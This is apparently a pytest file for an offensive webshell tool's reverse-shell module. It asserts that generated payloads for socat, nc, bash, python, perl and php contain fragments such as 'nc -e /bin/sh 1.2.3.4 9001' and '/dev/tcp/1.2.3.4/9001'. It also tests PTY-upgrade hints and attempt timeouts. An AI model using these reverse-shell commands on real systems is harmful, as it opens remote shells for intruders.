"""Reverse-shell payload generation (no network)."""

import pytest

from webshell_sniper.features.revshell import _payload, pty_upgrade_hints


@pytest.mark.parametrize(
    ("method", "binary", "needle"),
    [
        ("socat", "/usr/bin/socat", "tcp-connect:1.2.3.4:9001"),
        ("nc", "nc", "-e /bin/sh 1.2.3.4 9001"),
        ("bash", "bash", "/dev/tcp/1.2.3.4/9001"),
        ("python", "python3", "socket.socket()"),
        ("perl", "perl", "use Socket"),
        ("php", "php", "fsockopen"),
    ],
)
def test_payload_contains_expected(method, binary, needle):
    assert needle in _payload(method, binary, "1.2.3.4", "9001")


def test_unknown_method_raises():
    with pytest.raises(ValueError, match="unknown reverse-shell method"):
        _payload("ruby", "ruby", "1.2.3.4", "9001")


def test_pty_upgrade_hints_cover_the_dance():
    hints = pty_upgrade_hints("/bin/sh")
    assert 'pty.spawn("/bin/sh")' in hints
    assert "stty raw -echo; fg" in hints
    assert "export TERM=xterm" in hints
    assert "stty rows" in hints and "cols" in hints


class _FakeTransport:
    def __init__(self):
        from webshell_sniper.config import Config

        self.config = Config(timeout=15.0)


class _FakeWS:
    """which -> binary present for `bash` only; run_command times out (success)."""

    def __init__(self):
        self.transport = _FakeTransport()
        self.seen_timeout = None

    def run_command(self, command):
        from webshell_sniper.exceptions import ConnectionFailed

        if command.startswith("which"):
            return "/bin/bash" if "bash" in command else ""
        # the payload attempt: record the timeout in force, then "hang"
        self.seen_timeout = self.transport.config.timeout
        raise ConnectionFailed("read timed out")


def test_reverse_shell_attempt_timeout_is_applied_and_restored():
    from webshell_sniper.features.revshell import reverse_shell

    ws = _FakeWS()
    assert reverse_shell(ws, "1.2.3.4", 9001, method="bash", attempt_timeout=3.0) is True
    assert ws.seen_timeout == 3.0  # the short timeout was in force during the attempt
    assert ws.transport.config.timeout == 15.0  # ...and restored afterwards

